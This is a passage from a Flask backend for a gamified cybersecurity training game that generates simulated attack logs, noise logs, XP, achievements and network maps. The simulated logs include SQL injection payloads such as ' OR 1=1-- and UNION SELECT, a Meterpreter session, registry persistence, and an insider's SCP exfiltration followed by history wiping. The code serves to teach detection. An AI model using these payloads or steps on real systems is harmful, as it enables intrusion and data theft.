            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Phishing portal deployed at: http://secure-login.fake-domain.com/login'})
        elif step['step_number'] == 4:
            logs.append({'type': 'email_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Email sent to user@company.com | Subject: URGENT: Update Your Password | Sender: admin@compny.com'})
        elif step['step_number'] == 5:
            logs.extend([
                {'type': 'web_access_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                    'content': 'User clicked link | User-Agent: Mozilla/5.0 | Source IP: 203.0.113.45 | Destination: secure-login.fake-domain.com'},
                {'type': 'credential_log', 'timestamp': (base_time + timedelta(seconds=offset+10)).isoformat(),
                    'content': 'Credentials submitted | Username: user@company.com | IP: 203.0.113.45'}
            ])
        elif step['step_number'] == 6:
            logs.append({'type': 'authentication_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'SSH authentication successful | User: user@company.com | Source IP: 192.168.1.100 | Authentication method: password'})

    # Scenario 2: SQL Injection
    elif scenario_id == 2:
        base_time = datetime(2024, 2, 20, 14, 10)
        if step['step_number'] == 1:
            logs.append({'type': 'web_access_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Directory scan detected | Source: 10.0.0.88 | 247 requests in 30s | Paths: /login, /search, /admin, /api'})
        elif step['step_number'] == 2:
            logs.extend([
                {'type': 'web_access_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                    'content': "GET /search?q=' OR 1=1-- | Source: 10.0.0.88 | Response: 200 | Size: 15KB (abnormal)"},
                {'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset+5)).isoformat(),
                    'content': "SQL Error suppressed: You have an error in your SQL syntax near '' OR 1=1--'"}
            ])
        elif step['step_number'] == 3:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': "UNION SELECT table_name FROM information_schema.tables | DB: webapp_db | Tables found: users, payments, sessions"})
        elif step['step_number'] == 4:
            logs.append({'type': 'credential_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': "SELECT * FROM users | 847 rows extracted | Columns: id, username, email, password_hash, role, created_at"})
        elif step['step_number'] == 5:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': "Hash cracked: admin@target.com | Algorithm: MD5 | Password: Str0ngP@ss! | Role: administrator"})
        elif step['step_number'] == 6:
            logs.extend([
                {'type': 'authentication_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                    'content': "Admin login from 10.0.0.88 | User: admin@target.com | Session: admin_cookie_xyz"},
                {'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset+15)).isoformat(),
                    'content': "Data export: /admin/export?table=payments | 2,341 records | Contains: card_number, cvv, billing_address"}
            ])

    # Scenario 3: Malware & Ransomware
    elif scenario_id == 3:
        base_time = datetime(2024, 4, 5, 3, 30)
        if step['step_number'] == 1:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Payload compiled: update_patch.exe | Size: 73802 bytes | Type: PE32 executable | Detected AV evasion techniques'})
        elif step['step_number'] == 2:
            logs.append({'type': 'web_access_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Exploit kit injected into compromised-site.com | Drive-by download configured | Target browsers: Chrome, Edge, Firefox'})
        elif step['step_number'] == 3:
            logs.extend([
                {'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                    'content': 'Victim visited compromised-site.com | Download triggered: update_patch.exe | Executed with user privileges'},
                {'type': 'authentication_log', 'timestamp': (base_time + timedelta(seconds=offset+10)).isoformat(),
                    'content': 'Meterpreter session 1 opened | Target: 192.168.1.50 (DESKTOP-VICTIM) | OS: Windows 10 Pro | User: jsmith'}
            ])
        elif step['step_number'] == 4:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Registry key added: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | SMB spread to 192.168.1.51, 192.168.1.52'})
        elif step['step_number'] == 5:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Encryption started | Algorithm: AES-256-CBC | Files encrypted: 14,832 | Extensions: .docx, .xlsx, .pdf, .jpg, .sql'})
        elif step['step_number'] == 6:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Ransom note: README_DECRYPT.txt | Demand: 2 BTC (~$85,000) | Wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa | Deadline: 72h'})

    # Scenario 4: Insider Threat
    elif scenario_id == 4:
        base_time = datetime(2024, 3, 10, 22, 15)
        if step['step_number'] == 1:
            logs.append({'type': 'authentication_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Database login: john.doe@internal | DB: customer_data | Time: 22:15 (outside business hours) | Source: VPN 10.0.0.200'})
        elif step['step_number'] == 2:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'pg_dump executed on customer_data | Tables: credit_cards, ssn_records | Output: /tmp/.cache_data | Size: 128MB'})
        elif step['step_number'] == 3:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'SCP transfer initiated | Source: /tmp/.cache_data | Dest: personal-server.com | Size: 128MB | Duration: 45s'})
        elif step['step_number'] == 4:
            logs.append({'type': 'system_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'File shredded: /tmp/.cache_data (5-pass) | Bash history cleared | Last login timestamp modified to 09:00'})
        elif step['step_number'] == 5:
            logs.append({'type': 'web_access_log', 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
                'content': 'Tor connection established | Marketplace: xxxxxxx.onion | Listing: "45K customer records with PII" | Price: $50,000'})
        elif step['step_number'] == 6:
            logs.append({'type': 'authentication_log', 'timestamp': (base_time + timedelta(hours=11)).isoformat(),
                'content': 'Normal login: john.doe@internal | Time: 09:00 | Workstation: DESK-JD-042 | No anomalies in scheduled access'})

    # Scenario 5-8: Generic log generation
    elif scenario_id in [5, 6, 7, 8]:
        base_time = datetime(2024, 5, 20, 9, 0)
        log_types = ['system_log', 'web_access_log', 'authentication_log', 'system_log']
        lt = log_types[step['step_number'] % len(log_types)]
        logs.append({'type': lt, 'timestamp': (base_time + timedelta(seconds=offset)).isoformat(),
            'content': step['log_entry']})

    return logs

def generate_noise_logs(real_logs, count=8):
    """Generate benign noise logs to mix with real evidence in Detect Mode"""
    import random
    noise_templates = [
        ('system_log', 'Scheduled backup completed successfully | Duration: 2m 34s'),
        ('authentication_log', 'User login: sysadmin@internal | Source: 10.0.1.5 | Method: SSO'),
        ('system_log', 'Cron job executed: /etc/cron.daily/logrotate | Status: OK'),
        ('web_access_log', 'GET /health HTTP/1.1 | 200 | Response: 12ms | Monitor: UptimeRobot'),
        ('system_log', 'Antivirus definitions updated | Version: 2024.01.15.003'),
        ('authentication_log', 'VPN connection: remote-user@corp | Duration: 8h 15m | Normal hours'),
        ('system_log', 'Disk usage alert cleared: /var/log at 72% (was 85%)'),
        ('web_access_log', 'GET /api/status HTTP/1.1 | 200 | Internal health check'),
        ('system_log', 'NTP sync completed | Server: time.nist.gov | Drift: +0.003s'),
        ('authentication_log', 'Password change: hr-admin@internal | Policy: 90-day rotation'),
        ('system_log', 'SSL certificate renewal: *.company.com | Expires: 2025-01-15'),
        ('web_access_log', 'GET /favicon.ico HTTP/1.1 | 304 | Cache hit'),
        ('system_log', 'Firewall rule update: Allow TCP/443 from 10.0.0.0/8 | Admin: netops'),
        ('authentication_log', 'Failed login: unknown@external | Locked after 5 attempts | IP: 203.0.113.99'),
        ('system_log', 'Memory usage: 67% | Swap: 12% | No action required'),
    ]
    if not real_logs:
        return []
    timestamps = [log.get('timestamp', '2024-01-15T10:00:00') for log in real_logs]
    base = datetime.fromisoformat(timestamps[0]) if timestamps else datetime(2024, 1, 15, 10, 0)
    noise = []
    chosen = random.sample(noise_templates, min(count, len(noise_templates)))
    for i, (lt, content) in enumerate(chosen):
        t = base + timedelta(seconds=random.randint(-300, 600))
        noise.append({'id': 9000+i, 'scenario_id': 0, 'session_id': '', 'log_type': lt,
                      'timestamp': t.isoformat(), 'content': content, 'is_evidence': 0})
    return noise

def analyze_for_evidence(logs, user_analysis):
    """Check if user found key evidence"""
    evidence_logs = [l for l in logs if l.get('is_evidence', 1) != 0]
    found_email = any('admin@compny' in log['content'] for log in evidence_logs)
    found_domain = any('fake-domain' in log['content'] for log in evidence_logs)
    found_credentials = any('credential' in log['content'].lower() for log in evidence_logs)
    found_ssh = any('ssh' in log['content'].lower() and 'successful' in log['content'].lower() for log in evidence_logs)
    found_sqli = any('sql' in log['content'].lower() or 'union' in log['content'].lower() for log in evidence_logs)
    found_malware = any('meterpreter' in log['content'].lower() or 'encrypted' in log['content'].lower() for log in evidence_logs)
    found_insider = any('after hours' in log['content'].lower() or 'outside business' in log['content'].lower() for log in evidence_logs)
    found_exfil = any('scp' in log['content'].lower() or 'export' in log['content'].lower() for log in evidence_logs)
    
    return {
        'correct_findings': {
            'phishing_email_detected': found_email,
            'fake_domain_identified': found_domain,
            'credential_theft_found': found_credentials,
            'unauthorized_access_found': found_ssh,
            'sql_injection_detected': found_sqli,
            'malware_activity_found': found_malware,
            'insider_threat_detected': found_insider,
            'data_exfiltration_found': found_exfil
        },
        'score': sum([found_email, found_domain, found_credentials, found_ssh,
                      found_sqli, found_malware, found_insider, found_exfil]) * 12.5,
        'message': 'Investigation complete! Check your findings above.'
    }

# ==========================================
# NEW API ENDPOINTS
# ==========================================

@app.route('/api/user/profile', methods=['GET', 'POST'])
def user_profile():
    if request.method == 'POST':
        data = request.json
        username = data.get('username', '').strip()
        if not username:
            return jsonify({'error': 'Username required'}), 400
        db = get_db()
        cursor = db.cursor()
        cursor.execute('SELECT * FROM user_profiles WHERE username = ?', (username,))
        existing = cursor.fetchone()
        if existing:
            db.close()
            return jsonify(dict(existing))
        cursor.execute('INSERT INTO user_profiles (username, xp, level, completed_scenarios, created_at) VALUES (?,?,?,?,?)',
            (username, 0, 1, '[]', datetime.now().isoformat()))
        db.commit()
        user_id = cursor.lastrowid
        db.close()
        return jsonify({'id': user_id, 'username': username, 'xp': 0, 'level': 1, 'completed_scenarios': '[]'})
    else:
        username = request.args.get('username', '')
        db = get_db()
        cursor = db.cursor()
        cursor.execute('SELECT * FROM user_profiles WHERE username = ?', (username,))
        user = cursor.fetchone()
        db.close()
        if user:
            return jsonify(dict(user))
        return jsonify({'error': 'User not found'}), 404

@app.route('/api/user/xp', methods=['POST'])
def award_xp():
    data = request.json
    username = data.get('username', '')
    xp_amount = data.get('xp', 0)
    scenario_id = data.get('scenario_id')
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM user_profiles WHERE username = ?', (username,))
    user = cursor.fetchone()
    if not user:
        db.close()
        return jsonify({'error': 'User not found'}), 404
    user = dict(user)
    new_xp = user['xp'] + xp_amount
    new_level = min(5, 1 + new_xp // 500)
    completed = json.loads(user['completed_scenarios'])
    if scenario_id and scenario_id not in completed:
        completed.append(scenario_id)
    cursor.execute('UPDATE user_profiles SET xp = ?, level = ?, completed_scenarios = ? WHERE username = ?',
        (new_xp, new_level, json.dumps(completed), username))
    db.commit()
    db.close()
    level_names = {1: 'Recruit', 2: 'Analyst', 3: 'Specialist', 4: 'Expert', 5: 'Elite'}
    leveled_up = new_level > user['level']
    return jsonify({'xp': new_xp, 'level': new_level, 'level_name': level_names.get(new_level, 'Recruit'),
                    'leveled_up': leveled_up, 'completed_scenarios': completed})

@app.route('/api/achievements', methods=['GET'])
def get_achievements():
    username = request.args.get('username', '')
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM user_profiles WHERE username = ?', (username,))
    user = cursor.fetchone()
    if not user:
        db.close()
        return jsonify([])
    cursor.execute('SELECT achievement_key, unlocked_at FROM achievements WHERE user_id = ?', (user['id'],))
    unlocked = {row['achievement_key']: row['unlocked_at'] for row in cursor.fetchall()}
    db.close()
    all_achievements = [
        {'key': 'first_blood', 'name': 'First Blood', 'icon': '🩸', 'desc': 'Complete your first scenario'},
        {'key': 'speed_demon', 'name': 'Speed Demon', 'icon': '⚡', 'desc': 'Finish a scenario under 5 minutes'},
        {'key': 'perfect_analyst', 'name': 'Perfect Analyst', 'icon': '🎯', 'desc': 'Score 100% in Detect Mode'},
        {'key': 'red_master', 'name': 'Red Master', 'icon': '🔴', 'desc': 'Complete all Attack scenarios'},
        {'key': 'blue_master', 'name': 'Blue Master', 'icon': '🔵', 'desc': 'Complete all Detect scenarios'},
        {'key': 'knowledge_seeker', 'name': 'Knowledge Seeker', 'icon': '📚', 'desc': 'Read 10+ Luca entries'},
        {'key': 'elite_hacker', 'name': 'Elite Hacker', 'icon': '🏆', 'desc': 'Reach Level 5'},
        {'key': 'shadow_analyst', 'name': 'Shadow Analyst', 'icon': '🕵️', 'desc': 'Find all evidence without hints'},
        {'key': 'malware_hunter', 'name': 'Malware Hunter', 'icon': '💀', 'desc': 'Complete the malware scenario'},
        {'key': 'defender', 'name': 'Defender', 'icon': '🛡️', 'desc': 'Score 75%+ on 3 scenarios'},
        {'key': 'team_player', 'name': 'Team Player', 'icon': '👥', 'desc': 'Join a team'},
        {'key': 'duelist', 'name': 'Duelist', 'icon': '⚔️', 'desc': 'Complete a Red vs Blue session'},
    ]
    for a in all_achievements:
        a['unlocked'] = a['key'] in unlocked
        a['unlocked_at'] = unlocked.get(a['key'])
    return jsonify(all_achievements)

@app.route('/api/achievements/unlock', methods=['POST'])
def unlock_achievement():
    data = request.json
    username = data.get('username', '')
    key = data.get('achievement_key', '')
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT id FROM user_profiles WHERE username = ?', (username,))
    user = cursor.fetchone()
    if not user:
        db.close()
        return jsonify({'error': 'User not found'}), 404
    cursor.execute('SELECT id FROM achievements WHERE user_id = ? AND achievement_key = ?', (user['id'], key))
    if cursor.fetchone():
        db.close()
        return jsonify({'already_unlocked': True})
    cursor.execute('INSERT INTO achievements (user_id, achievement_key, unlocked_at) VALUES (?,?,?)',
        (user['id'], key, datetime.now().isoformat()))
    db.commit()
    db.close()
    return jsonify({'unlocked': True, 'achievement_key': key})

@app.route('/api/dashboard', methods=['GET'])
def get_dashboard():
    username = request.args.get('username', '')
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM user_profiles WHERE username = ?', (username,))
    user = cursor.fetchone()
    if not user:
        db.close()
        return jsonify({'error': 'User not found'}), 404
    user = dict(user)
    cursor.execute('SELECT COUNT(*) as cnt FROM achievements WHERE user_id = ?', (user['id'],))
    ach_count = cursor.fetchone()['cnt']
    cursor.execute('SELECT COUNT(*) as cnt FROM scenarios')
    total_scenarios = cursor.fetchone()['cnt']
    completed = json.loads(user['completed_scenarios'])
    db.close()
    level_names = {1: 'Recruit', 2: 'Analyst', 3: 'Specialist', 4: 'Expert', 5: 'Elite'}
    return jsonify({
        'username': user['username'], 'xp': user['xp'], 'level': user['level'],
        'level_name': level_names.get(user['level'], 'Recruit'),
        'xp_to_next': 500 - (user['xp'] % 500), 'xp_progress': (user['xp'] % 500) / 500 * 100,
        'completed_scenarios': len(completed), 'total_scenarios': total_scenarios,
        'achievements_unlocked': ach_count, 'total_achievements': 12
    })

@app.route('/api/luca', methods=['GET'])
def get_luca():
    db = get_db()
    cursor = db.cursor()
    search = request.args.get('search', '')
    category = request.args.get('category', '')
    if search:
        cursor.execute('SELECT * FROM luca WHERE term LIKE ? OR definition LIKE ?',
            (f'%{search}%', f'%{search}%'))
    elif category:
        cursor.execute('SELECT * FROM luca WHERE category = ?', (category,))
    else:
        cursor.execute('SELECT * FROM luca')
    entries = [dict(row) for row in cursor.fetchall()]
    cursor.execute('SELECT DISTINCT category FROM luca')
    categories = [row['category'] for row in cursor.fetchall()]
    db.close()
    return jsonify({'entries': entries, 'categories': categories})

@app.route('/api/teams', methods=['GET', 'POST'])
def teams():
    db = get_db()
    cursor = db.cursor()
    if request.method == 'POST':
        data = request.json
        action = data.get('action', 'create')
        if action == 'create':
            name = data.get('team_name', '').strip()
            username = data.get('username', '')
            if not name:
                db.close()
                return jsonify({'error': 'Team name required'}), 400
            try:
                cursor.execute('INSERT INTO teams (team_name, members, total_score, created_at) VALUES (?,?,?,?)',
                    (name, json.dumps([username]), 0, datetime.now().isoformat()))
                db.commit()
                db.close()
                return jsonify({'success': True, 'team_name': name})
            except sqlite3.IntegrityError:
                db.close()
                return jsonify({'error': 'Team name taken'}), 400
        elif action == 'join':
            name = data.get('team_name', '')
            username = data.get('username', '')
            cursor.execute('SELECT * FROM teams WHERE team_name = ?', (name,))
            team = cursor.fetchone()
            if not team:
                db.close()
                return jsonify({'error': 'Team not found'}), 404
            members = json.loads(team['members'])
            if username not in members:
                members.append(username)
                cursor.execute('UPDATE teams SET members = ? WHERE team_name = ?', (json.dumps(members), name))
                db.commit()
            db.close()
            return jsonify({'success': True, 'team_name': name, 'members': members})
        elif action == 'add_score':
            name = data.get('team_name', '')
            score = data.get('score', 0)
            cursor.execute('UPDATE teams SET total_score = total_score + ? WHERE team_name = ?', (score, name))
            db.commit()
            db.close()
            return jsonify({'success': True})
    cursor.execute('SELECT * FROM teams ORDER BY total_score DESC')
    teams_list = [dict(row) for row in cursor.fetchall()]
    for t in teams_list:
        t['members'] = json.loads(t['members'])
    db.close()
    return jsonify(teams_list)

@app.route('/api/session-logs-with-noise/<session_id>', methods=['GET'])
def get_session_logs_with_noise(session_id):
    """Get logs with noise for Detect Mode"""
    import random
    db = get_db()
    cursor = db.cursor()
    cursor.execute('SELECT * FROM generated_logs WHERE session_id = ? ORDER BY timestamp', (session_id,))
    logs = [dict(row) for row in cursor.fetchall()]
    db.close()
    noise = generate_noise_logs(logs)
    all_logs = logs + noise
    all_logs.sort(key=lambda x: x.get('timestamp', ''))
    return jsonify(all_logs)

@app.route('/api/network-map/<int:scenario_id>', methods=['GET'])
def get_network_map(scenario_id):
    """Get network topology data for visualization"""
    maps = {
        1: {'nodes': [{'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
                      {'id':'email','label':'Mail Server','type':'server','x':250,'y':100},
                      {'id':'portal','label':'Fake Portal','type':'malicious','x':250,'y':300},
                      {'id':'victim','label':'Victim','type':'workstation','x':450,'y':200},
                      {'id':'internal','label':'Internal Server','type':'server','x':650,'y':200}],
            'edges': [{'from':'attacker','to':'email'},{'from':'attacker','to':'portal'},
                      {'from':'email','to':'victim'},{'from':'victim','to':'portal'},{'from':'victim','to':'internal'}]},
        2: {'nodes': [{'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
                      {'id':'webapp','label':'Web App','type':'server','x':250,'y':200},
                      {'id':'db','label':'Database','type':'database','x':450,'y':200},
                      {'id':'admin','label':'Admin Panel','type':'server','x':450,'y':350}],
            'edges': [{'from':'attacker','to':'webapp'},{'from':'webapp','to':'db'},{'from':'db','to':'admin'}]},
        3: {'nodes': [{'id':'attacker','label':'Attacker C2','type':'attacker','x':50,'y':200},
                      {'id':'compromised','label':'Compromised Site','type':'malicious','x':250,'y':100},
                      {'id':'victim','label':'Victim PC','type':'workstation','x':450,'y':200},
                      {'id':'server1','label':'File Server','type':'server','x':650,'y':100},
                      {'id':'server2','label':'DC Server','type':'server','x':650,'y':300}],
            'edges': [{'from':'attacker','to':'compromised'},{'from':'compromised','to':'victim'},
                      {'from':'victim','to':'server1'},{'from':'victim','to':'server2'},{'from':'attacker','to':'victim'}]},
        4: {'nodes': [{'id':'insider','label':'Insider (John)','type':'attacker','x':50,'y':200},
                      {'id':'vpn','label':'VPN Gateway','type':'server','x':250,'y':200},
                      {'id':'db','label':'Customer DB','type':'database','x':450,'y':200},
                      {'id':'personal','label':'Personal Server','type':'malicious','x':450,'y':350},
                      {'id':'darkweb','label':'Dark Web','type':'malicious','x':650,'y':350}],
            'edges': [{'from':'insider','to':'vpn'},{'from':'vpn','to':'db'},{'from':'db','to':'personal'},{'from':'personal','to':'darkweb'}]},
    }
    maps[5] = {'nodes': [
        {'id':'attacker','label':'Botnet C2','type':'attacker','x':50,'y':200},
        {'id':'bot1','label':'Bot Node 1','type':'malicious','x':180,'y':80},
        {'id':'bot2','label':'Bot Node 2','type':'malicious','x':180,'y':200},
        {'id':'bot3','label':'Bot Node 3','type':'malicious','x':180,'y':320},
        {'id':'firewall','label':'Firewall','type':'firewall','x':370,'y':200},
        {'id':'web','label':'Web Server','type':'server','x':520,'y':130},
        {'id':'api','label':'API Server','type':'server','x':520,'y':270},
        {'id':'cdn','label':'CDN Edge','type':'cloud','x':650,'y':200}],
        'edges': [{'from':'attacker','to':'bot1'},{'from':'attacker','to':'bot2'},{'from':'attacker','to':'bot3'},
                  {'from':'bot1','to':'firewall'},{'from':'bot2','to':'firewall'},{'from':'bot3','to':'firewall'},
                  {'from':'firewall','to':'web'},{'from':'firewall','to':'api'},{'from':'cdn','to':'web'}]}
    maps[6] = {'nodes': [
        {'id':'attacker','label':'Attacker','type':'attacker','x':350,'y':50},
        {'id':'router','label':'Gateway','type':'router','x':350,'y':200},
        {'id':'victim','label':'Victim PC','type':'workstation','x':150,'y':320},
        {'id':'server','label':'Mail Server','type':'server','x':550,'y':320},
        {'id':'dns','label':'DNS Server','type':'server','x':550,'y':130},
        {'id':'switch','label':'Switch','type':'router','x':200,'y':200}],
        'edges': [{'from':'attacker','to':'router'},{'from':'router','to':'victim'},{'from':'router','to':'server'},
                  {'from':'attacker','to':'switch'},{'from':'switch','to':'victim'},{'from':'router','to':'dns'}]}
    maps[7] = {'nodes': [
        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
        {'id':'rogue','label':'Rogue DNS','type':'malicious','x':200,'y':100},
        {'id':'resolver','label':'DNS Resolver','type':'server','x':350,'y':200},
        {'id':'real_dns','label':'Real DNS','type':'server','x':350,'y':60},
        {'id':'clone','label':'Fake Bank','type':'malicious','x':200,'y':320},
        {'id':'victim','label':'Victim','type':'workstation','x':520,'y':200},
        {'id':'bank','label':'Real Bank','type':'server','x':650,'y':120}],
        'edges': [{'from':'attacker','to':'rogue'},{'from':'rogue','to':'resolver'},{'from':'resolver','to':'victim'},
                  {'from':'attacker','to':'clone'},{'from':'victim','to':'clone'},{'from':'real_dns','to':'resolver'},
                  {'from':'victim','to':'bank'}]}
    maps[8] = {'nodes': [
        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
        {'id':'registry','label':'NPM Registry','type':'cloud','x':230,'y':100},
        {'id':'package','label':'Backdoored Pkg','type':'malicious','x':230,'y':300},
        {'id':'ci','label':'CI/CD Pipeline','type':'server','x':420,'y':200},
        {'id':'dev','label':'Developer','type':'workstation','x':420,'y':340},
        {'id':'enterprise','label':'Enterprise','type':'server','x':600,'y':130},
        {'id':'aws','label':'AWS Cloud','type':'cloud','x':600,'y':290}],
        'edges': [{'from':'attacker','to':'registry'},{'from':'attacker','to':'package'},{'from':'registry','to':'ci'},
                  {'from':'package','to':'dev'},{'from':'ci','to':'enterprise'},{'from':'dev','to':'enterprise'},
                  {'from':'enterprise','to':'aws'}]}
    # Scenario 9: XSS
    maps[9] = {'nodes': [
        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
        {'id':'webapp','label':'Web App','type':'server','x':250,'y':200},
        {'id':'comment','label':'Comment Section','type':'malicious','x':250,'y':350},
        {'id':'victim','label':'Victim Browser','type':'workstation','x':450,'y':200},
        {'id':'cookie','label':'Cookie Stealer','type':'malicious','x':450,'y':350},
        {'id':'admin','label':'Admin Panel','type':'server','x':650,'y':200}],
        'edges': [{'from':'attacker','to':'webapp'},{'from':'attacker','to':'comment'},{'from':'victim','to':'comment'},
                  {'from':'victim','to':'cookie'},{'from':'cookie','to':'attacker'},{'from':'attacker','to':'admin'}]}
    # Scenario 10: Rogue AP
    maps[10] = {'nodes': [
        {'id':'attacker','label':'Rogue AP','type':'attacker','x':200,'y':50},
        {'id':'legit','label':'Real WiFi','type':'router','x':500,'y':50},
        {'id':'v1','label':'Client 1','type':'workstation','x':100,'y':250},
        {'id':'v2','label':'Client 2','type':'workstation','x':300,'y':250},
        {'id':'v3','label':'Client 3','type':'workstation','x':500,'y':250},
        {'id':'proxy','label':'HTTP Proxy','type':'malicious','x':200,'y':350}],
        'edges': [{'from':'v1','to':'attacker'},{'from':'v2','to':'attacker'},{'from':'v3','to':'legit'},
                  {'from':'attacker','to':'proxy'},{'from':'proxy','to':'legit'}]}
    # Scenario 11: Rainbow Table
    maps[11] = {'nodes': [
        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
        {'id':'db','label':'Breached DB','type':'database','x':250,'y':200},
        {'id':'rainbow','label':'Rainbow Tables','type':'malicious','x':450,'y':100},
        {'id':'hashcat','label':'Hashcat','type':'malicious','x':450,'y':300},
        {'id':'creds','label':'Cracked Creds','type':'server','x':650,'y':200}],
        'edges': [{'from':'attacker','to':'db'},{'from':'db','to':'rainbow'},{'from':'db','to':'hashcat'},
                  {'from':'rainbow','to':'creds'},{'from':'hashcat','to':'creds'}]}
    # Scenario 12: Social Engineering
    maps[12] = {'nodes': [
        {'id':'attacker','label':'Social Engineer','type':'attacker','x':50,'y':200},
        {'id':'osint','label':'OSINT/LinkedIn','type':'cloud','x':250,'y':80},
        {'id':'phone','label':'Vishing Call','type':'malicious','x':250,'y':320},
        {'id':'victim','label':'IT Admin','type':'workstation','x':450,'y':200},
        {'id':'vpn','label':'Corporate VPN','type':'server','x':650,'y':130},
        {'id':'files','label':'File Server','type':'server','x':650,'y':280}],
        'edges': [{'from':'attacker','to':'osint'},{'from':'attacker','to':'phone'},{'from':'phone','to':'victim'},
                  {'from':'victim','to':'vpn'},{'from':'vpn','to':'files'}]}
    # Scenario 13: Cryptojacking
    maps[13] = {'nodes': [
        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
        {'id':'s1','label':'Server 1','type':'server','x':250,'y':100},
        {'id':'s2','label':'Server 2','type':'server','x':250,'y':300},
        {'id':'miner','label':'XMRig Miner','type':'malicious','x':450,'y':200},
        {'id':'pool','label':'Mining Pool','type':'cloud','x':650,'y':200}],
        'edges': [{'from':'attacker','to':'s1'},{'from':'attacker','to':'s2'},{'from':'s1','to':'miner'},
                  {'from':'s2','to':'miner'},{'from':'miner','to':'pool'}]}
    # Scenario 14: Backdoor
    maps[14] = {'nodes': [
        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
        {'id':'vuln','label':'Vuln Service','type':'server','x':250,'y':200},
        {'id':'backdoor','label':'Backdoor','type':'malicious','x':450,'y':120},
        {'id':'ssh','label':'SSH Key','type':'malicious','x':450,'y':280},
        {'id':'rootshell','label':'Root Shell','type':'server','x':650,'y':200}],
        'edges': [{'from':'attacker','to':'vuln'},{'from':'vuln','to':'backdoor'},{'from':'vuln','to':'ssh'},
                  {'from':'backdoor','to':'rootshell'},{'from':'ssh','to':'rootshell'}]}
    # Scenario 15: Privilege Escalation
    maps[15] = {'nodes': [
        {'id':'lowuser','label':'Low-Priv User','type':'workstation','x':50,'y':200},
        {'id':'linpeas','label':'LinPEAS Scan','type':'malicious','x':230,'y':120},
        {'id':'suid','label':'SUID Binary','type':'server','x':230,'y':300},
        {'id':'root','label':'Root Shell','type':'attacker','x':450,'y':200},
        {'id':'shadow','label':'/etc/shadow','type':'database','x':650,'y':200}],
        'edges': [{'from':'lowuser','to':'linpeas'},{'from':'lowuser','to':'suid'},{'from':'suid','to':'root'},
                  {'from':'root','to':'shadow'}]}
    # Scenario 16: Session Hijacking
    maps[16] = {'nodes': [
        {'id':'attacker','label':'Sniffer','type':'attacker','x':350,'y':50},
        {'id':'network','label':'Shared Network','type':'router','x':350,'y':200},
        {'id':'victim','label':'Admin User','type':'workstation','x':150,'y':350},
        {'id':'webapp','label':'Web App','type':'server','x':550,'y':350},
        {'id':'cookie','label':'Session Token','type':'malicious','x':550,'y':130}],
        'edges': [{'from':'victim','to':'network'},{'from':'network','to':'webapp'},{'from':'attacker','to':'network'},
                  {'from':'network','to':'cookie'},{'from':'cookie','to':'attacker'}]}
    # Scenario 17: Spyware
    maps[17] = {'nodes': [
        {'id':'attacker','label':'Attacker C2','type':'attacker','x':50,'y':200},
        {'id':'email','label':'Phishing Email','type':'malicious','x':250,'y':100},
        {'id':'victim','label':'Victim PC','type':'workstation','x':450,'y':200},
        {'id':'keylog','label':'Keylogger','type':'malicious','x':250,'y':300},
        {'id':'data','label':'Exfil Server','type':'server','x':650,'y':200}],
        'edges': [{'from':'attacker','to':'email'},{'from':'email','to':'victim'},{'from':'victim','to':'keylog'},
                  {'from':'keylog','to':'data'},{'from':'data','to':'attacker'}]}
    # Scenario 18: Evil Twin
    maps[18] = {'nodes': [
        {'id':'attacker','label':'Evil Twin AP','type':'attacker','x':200,'y':50},
        {'id':'legit','label':'Legit AP','type':'router','x':500,'y':50},
        {'id':'captive','label':'Captive Portal','type':'malicious','x':200,'y':250},
        {'id':'v1','label':'Victim 1','type':'workstation','x':350,'y':350},
        {'id':'v2','label':'Victim 2','type':'workstation','x':500,'y':250},
        {'id':'internal','label':'Corp Network','type':'server','x':650,'y':150}],
        'edges': [{'from':'attacker','to':'captive'},{'from':'v1','to':'attacker'},{'from':'v2','to':'legit'},
                  {'from':'captive','to':'attacker'},{'from':'attacker','to':'internal'}]}
    # Scenario 19: Handshake Capture
    maps[19] = {'nodes': [
